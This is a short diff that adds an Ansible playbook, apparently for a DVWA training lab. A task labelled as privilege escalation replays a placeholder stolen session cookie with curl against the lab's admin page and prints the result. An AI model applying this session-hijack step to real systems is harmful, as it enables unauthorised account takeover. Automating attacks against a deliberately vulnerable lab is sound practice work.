@@ -1,0 +1,10 @@
+---
+- name: Privilege Escalation - Session hijack using stolen cookie
+  shell: |
+    curl -b "security=low; PHPSESSID=stolen_cookie_value" \
+    http://192.168.254.129/DVWA/admin/
+  register: hijack_result
+
+- name: Show result of admin panel access
+  debug:
+    var: hijack_result.stdout
